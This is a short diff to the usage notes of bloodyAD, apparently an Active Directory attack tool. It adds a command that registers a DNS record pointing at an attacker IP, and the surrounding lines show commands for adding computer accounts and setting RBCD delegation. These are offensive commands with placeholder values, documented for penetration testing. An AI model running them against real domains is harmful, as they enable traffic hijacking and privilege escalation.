@@ -103,6 +103,10 @@ bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_
 ```
 bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
 ```
+### Registering a DNS Record
+```
+bloodyAD --host $dc -d $domain -u $username -p $password add dnsRecord $record_name $attacker_ip
+```
 ### Notes
 - Pass `-k` to use kerberos authentication
 - You can pass a user hash instead of a password using `-p :hash` 
